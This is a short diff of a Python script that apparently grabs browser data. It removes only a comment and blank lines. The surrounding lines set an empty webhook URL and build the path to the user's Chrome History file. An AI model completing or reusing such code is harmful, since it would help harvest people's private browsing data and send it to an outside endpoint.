@@ -3,7 +3,6 @@ import re
 import json
 import requests
 from urllib.request import Request, urlopen
-# Sql
 import sqlite
 
 wh_url = "" # Too lazy
@@ -36,12 +35,6 @@ def main():
 
 
   try:
-
-
-
-        
-
-
 
     try:
             full_path = os.environ['LOCALAPPDATA'] + "\\Google\\Chrome\\User Data\\Default\\" + "History"
